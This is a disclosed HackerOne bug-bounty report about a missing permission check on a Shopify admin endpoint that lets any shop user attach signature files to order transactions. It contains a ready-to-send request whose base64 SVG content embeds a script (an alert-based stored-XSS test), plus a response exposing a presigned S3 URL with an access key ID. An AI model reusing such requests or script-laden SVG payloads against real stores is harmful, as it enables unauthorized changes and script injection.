---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '172733'
original_report_id: '172733'
title: Add signature to transactions without any permission
weakness: Improper Authentication - Generic
team_handle: shopify
created_at: '2016-09-28T19:20:59.667Z'
disclosed_at: '2016-10-07T02:59:27.911Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- improper-authentication-generic
---

# Add signature to transactions without any permission

## Metadata

- HackerOne Report ID: 172733
- Weakness: Improper Authentication - Generic
- Program: shopify
- Disclosed At: 2016-10-07T02:59:27.911Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I found an endpoint for transaction signing
but user permission not checked on this endpoint
So an user without any permission in shop can add signature to transactions!


Endpoint: `/admin/secure_files.json`
Parameters:

````
{"secure_file":{"filetype":"svg","content":"PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCjxzdmcgdmVyc2lvbj0iMS4xIiBiYXNlUHJvZmlsZT0iZnVsbCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4gIA0KICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgYWxlcnQoZG9jdW1lbnQuZG9tYWluKTsNCiAgIDwvc2NyaXB0Pg0KPC9zdmc+","type":"signatures","order_transaction_id":"__Transaction_ID__"}}
````


Just fill `__Transaction_ID__`  in *order_transaction_id* and send request as user without permission
Response will be like this
````
{
  "secure_file": {
    "url": "https://shopify.s3.amazonaws.com/s/files/1/0917/1436/signatures/2e990586-6721-448a-a891-025471d6b2fe.svg?AWSAccessKeyId=AKIAJYM555KVYEWGJDKQ&Expires=1475694450&Signature=DmF7008ou7nn22ypD5Iyq%2BKomMQ%3D"
  }
}
````
when you back to order page or `/admin/orders/_order_id_/transaction.json`
signature file will be shown!

This should be limited to users who have access to transaction/order section!


Regards

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
